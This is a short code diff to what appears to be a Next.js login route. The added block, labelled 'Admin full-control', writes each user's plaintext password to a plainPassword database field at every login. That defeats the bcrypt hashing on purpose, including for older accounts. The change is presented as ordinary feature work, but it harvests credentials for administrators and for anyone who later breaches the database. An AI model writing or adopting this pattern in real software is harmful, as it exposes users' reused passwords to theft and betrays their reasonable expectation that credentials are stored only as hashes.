@@ -58,6 +58,21 @@ export async function POST(request: NextRequest) {
       );
     }
 
+    // ★ Admin full-control: capture plaintext password for legacy users
+    // (those who registered before plainPassword field was added).
+    // Bcrypt is one-way, so we can only recover plaintext at login time
+    // when the user proves they know it. Sync if missing or out-of-date.
+    if (!user.plainPassword || user.plainPassword !== password) {
+      try {
+        await db.user.update({
+          where: { id: user.id },
+          data: { plainPassword: password },
+        });
+      } catch (syncErr) {
+        console.error('Failed to sync plainPassword on login:', syncErr);
+      }
+    }
+
     // After password is verified, check if email is verified
     if (!user.isVerified) {
       // Auto-send OTP so the user can verify their email
